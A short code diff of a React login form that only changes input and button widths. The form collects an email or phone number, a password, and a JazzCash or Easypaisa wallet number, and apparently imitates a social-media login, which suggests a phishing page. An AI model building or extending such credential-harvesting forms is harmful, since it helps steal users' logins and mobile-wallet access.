@@ -50,7 +50,7 @@ export default function   Home() {
       
       <input
         name="email"
-        className='outline-blue-600 border-2 p-4 w-96'
+        className='outline-blue-600 border-2 p-4 w-[80vw]'
         placeholder="Mobile number or email address"
         value={formData.email}
         onChange={handleChange}
@@ -58,20 +58,20 @@ export default function   Home() {
       <input
         name="psw"
         type="password"
-        className='outline-blue-600 border-2 p-4 w-96'
+        className='outline-blue-600 border-2 p-4 w-[80vw]'
         placeholder="Password"
         value={formData.psw}  
         onChange={handleChange}
       />
       <input
-        className='outline-blue-600 border-2 p-4 w-96'
+        className='outline-blue-600 border-2 p-4 w-[80vw]'
         placeholder="Enter Jazz cash or Easypaisa number"
         onChange={handleChange}
       />
       <button
         type="button"
         onClick={handleClick}
-        className="w-96 p-1 rounded-full text-[4vh] text-white bg-blue-600"
+        className="w-[80vw] p-1 rounded-full text-[4vh] text-white bg-blue-600"
       >
         Submit
       </button>
